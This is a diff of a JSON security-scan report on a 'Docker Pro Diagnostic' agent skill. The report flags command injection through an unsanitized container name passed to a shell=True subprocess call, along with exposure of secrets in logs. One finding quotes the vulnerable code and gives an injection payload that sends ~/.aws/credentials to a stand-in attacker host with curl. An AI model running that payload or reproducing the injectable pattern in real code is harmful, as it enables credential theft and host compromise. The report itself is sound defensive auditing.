@@ -1,43 +1,11 @@
 {
   "skill_name": "Docker Pro Diagnostic",
-  "skill_path": "./skills/clawhub-docker-diag",
-  "skill_directory": "./skills/clawhub-docker-diag",
+  "skill_path": "/workspace/skills/clawhub-docker-diag",
+  "skill_directory": "/workspace/skills/clawhub-docker-diag",
   "is_safe": false,
   "max_severity": "HIGH",
   "findings_count": 3,
   "findings": [
-    {
-      "id": "MANIFEST_INVALID_NAME_794e30271c",
-      "rule_id": "MANIFEST_INVALID_NAME",
-      "category": "policy_violation",
-      "severity": "LOW",
-      "title": "Skill name does not follow agent skills naming rules",
-      "description": "Skill name 'Docker Pro Diagnostic' is invalid. Agent skills require lowercase letters, numbers, and hyphens only, with a maximum length of 64 characters.",
-      "file_path": "SKILL.md",
-      "line_number": null,
-      "snippet": null,
-      "remediation": "Rename the skill to match `[a-z0-9-]{1,64}` (e.g., 'pdf-processing')",
-      "analyzer": "static",
-      "metadata": {
-        "meta_reviewed": true
-      }
-    },
-    {
-      "id": "MANIFEST_MISSING_LICENSE_c5ae9be793",
-      "rule_id": "MANIFEST_MISSING_LICENSE",
-      "category": "policy_violation",
-      "severity": "LOW",
-      "title": "Skill does not specify a license",
-      "description": "Skill manifest does not include a 'license' field. Specifying a license helps users understand usage terms.",
-      "file_path": "SKILL.md",
-      "line_number": null,
-      "snippet": null,
-      "remediation": "Add 'license' field to SKILL.md frontmatter (e.g., MIT, Apache-2.0)",
-      "analyzer": "static",
-      "metadata": {
-        "meta_reviewed": true
-      }
-    },
     {
       "id": "COMMAND_INJECTION_SHELL_TRUE_779ae9cb6c",
       "rule_id": "COMMAND_INJECTION_SHELL_TRUE",
@@ -56,12 +24,78 @@
         "aitech": "AITech-9.1",
         "aitech_name": "Model or Agentic System Manipulation",
         "scanner_category": "INJECTION ATTACK",
+        "meta_validated": true,
+        "meta_confidence": "HIGH",
+        "meta_confidence_reason": "Both static analyzer and LLM analyzer independently identified this command injection vulnerability. The code clearly shows unsanitized user input being interpolated into a shell command with shell=True, which is a textbook command injection pattern.",
+        "meta_exploitability": "Easy - no authentication required. Any user who can invoke this skill can execute arbitrary commands by providing a malicious container name.",
+        "meta_impact": "Critical - full system compromise. Attacker can execute arbitrary commands with agent privileges, potentially reading credentials, exfiltrating data, or destroying files."
+      }
+    },
+    {
+      "id": "llm_finding_Docker Pro Diagnostic_0",
+      "rule_id": "LLM_COMMAND_INJECTION",
+      "category": "command_injection",
+      "severity": "HIGH",
+      "title": "Command Injection Vulnerability via Unsanitized Container Name",
+      "description": "The log_processor.py script constructs a shell command using f-string interpolation with the user-provided container_name parameter without any input validation or sanitization. The command 'docker logs --tail {max_lines} {container_name}' is executed via subprocess.run() with shell=True, allowing arbitrary command injection. An attacker could provide a malicious container name like 'foo; curl http://attacker.com/exfil?data=$(cat ~/.aws/credentials)' to execute arbitrary commands on the host system.",
+      "file_path": "log_processor.py",
+      "line_number": 13,
+      "snippet": "cmd = f\"docker logs --tail {max_lines} {container_name}\"\nresult = subprocess.run(cmd, shell=True, capture_output=True, text=True)",
+      "remediation": "1. Remove shell=True and pass arguments as a list: subprocess.run(['docker', 'logs', '--tail', str(max_lines), container_name], capture_output=True, text=True). 2. Add input validation to ensure container_name matches expected Docker container naming patterns (alphanumeric, hyphens, underscores only). 3. Use shlex.quote() if shell=True is absolutely necessary (though it should be avoided).",
+      "analyzer": "llm",
+      "metadata": {
+        "model": "claude-sonnet-4-5-20250929",
+        "overall_assessment": "This Docker diagnostic skill contains a CRITICAL command injection vulnerability due to unsanitized user input being passed to shell execution. The skill legitimately analyzes Docker container logs for troubleshooting, but the implementation has serious security flaws. The primary concern is the use of shell=True with f-string interpolation of user-provided container names, allowing arbitrary command execution. Additionally, the skill accesses Docker logs which may contain sensitive credentials and secrets without any filtering or redaction mechanisms. The missing allowed-tools declaration and lack of input validation compound these security issues. While the skill's stated purpose is legitimate, the implementation requires significant security hardening before it can be safely used.",
+        "primary_threats": [
+          "Command Injection",
+          "Unauthorized Tool Access",
+          "Sensitive Data Exposure",
+          "Missing Security Controls"
+        ],
+        "aitech": "AITech-9.1",
+        "aitech_name": "Model or Agentic System Manipulation",
+        "aisubtech": "AISubtech-9.1.4",
+        "aisubtech_name": "Injection Attacks (SQL, Command Execution, XSS)",
+        "scanner_category": "INJECTION ATTACK",
         "meta_reviewed": true
+      }
+    },
+    {
+      "id": "llm_finding_Docker Pro Diagnostic_2",
+      "rule_id": "LLM_DATA_EXFILTRATION",
+      "category": "data_exfiltration",
+      "severity": "MEDIUM",
+      "title": "Potential Sensitive Data Exposure via Docker Logs",
+      "description": "The skill reads Docker container logs which commonly contain sensitive information such as API keys, database credentials, authentication tokens, internal IP addresses, and stack traces with code paths. The script extracts and returns up to 50 lines of log content including error context without any filtering or redaction of sensitive data. This information is then passed to the AI agent's reasoning engine, potentially exposing secrets. While the skill's purpose is legitimate log analysis, there are no safeguards against inadvertent credential exposure.",
+      "file_path": "log_processor.py",
+      "line_number": null,
+      "snippet": "result = subprocess.run(cmd, shell=True, capture_output=True, text=True)\nlines = result.stderr.splitlines() + result.stdout.splitlines()\n...\nreturn \"\\n\".join(findings[:50])",
+      "remediation": "1. Implement sensitive data filtering to redact common patterns (API keys, tokens, passwords, connection strings) before returning log content. 2. Add a warning in SKILL.md that users should review logs for sensitive data before analysis. 3. Consider implementing a --redact flag that applies regex-based filtering for common secret patterns. 4. Limit the scope of log access to specific containers rather than allowing arbitrary container names.",
+      "analyzer": "llm",
+      "metadata": {
+        "model": "claude-sonnet-4-5-20250929",
+        "overall_assessment": "This Docker diagnostic skill contains a CRITICAL command injection vulnerability due to unsanitized user input being passed to shell execution. The skill legitimately analyzes Docker container logs for troubleshooting, but the implementation has serious security flaws. The primary concern is the use of shell=True with f-string interpolation of user-provided container names, allowing arbitrary command execution. Additionally, the skill accesses Docker logs which may contain sensitive credentials and secrets without any filtering or redaction mechanisms. The missing allowed-tools declaration and lack of input validation compound these security issues. While the skill's stated purpose is legitimate, the implementation requires significant security hardening before it can be safely used.",
+        "primary_threats": [
+          "Command Injection",
+          "Unauthorized Tool Access",
+          "Sensitive Data Exposure",
+          "Missing Security Controls"
+        ],
+        "aitech": "AITech-8.2",
+        "aitech_name": "Data Exfiltration / Exposure",
+        "aisubtech": "AISubtech-8.2.3",
+        "aisubtech_name": "Data Exfiltration via Agent Tooling",
+        "scanner_category": "SECURITY VIOLATION",
+        "meta_validated": true,
+        "meta_confidence": "HIGH",
+        "meta_confidence_reason": "LLM analyzer correctly identified that Docker logs commonly contain credentials. This is a well-known security concern in log analysis tools. While not actively malicious, the lack of filtering creates unnecessary risk.",
+        "meta_exploitability": "Medium - requires that applications actually log credentials (common but not universal). Attacker would need to trigger log analysis on a container that logs secrets.",
+        "meta_impact": "Medium to High - if credentials are present in logs, they would be exposed to the AI agent and potentially to the user or logged in conversation history."
       }
     }
   ],
-  "scan_duration_seconds": 1.1686372756958008,
-  "duration_ms": 1168,
+  "scan_duration_seconds": 31.470020055770874,
+  "duration_ms": 31470,
   "analyzers_used": [
     "static_analyzer",
     "behavioral_analyzer",
@@ -69,5 +103,5 @@
     "trigger_analyzer",
     "meta_analyzer"
   ],
-  "timestamp": "2026-02-03T15:59:19.192574"
+  "timestamp": "2026-02-06T00:22:48.712572"
 }
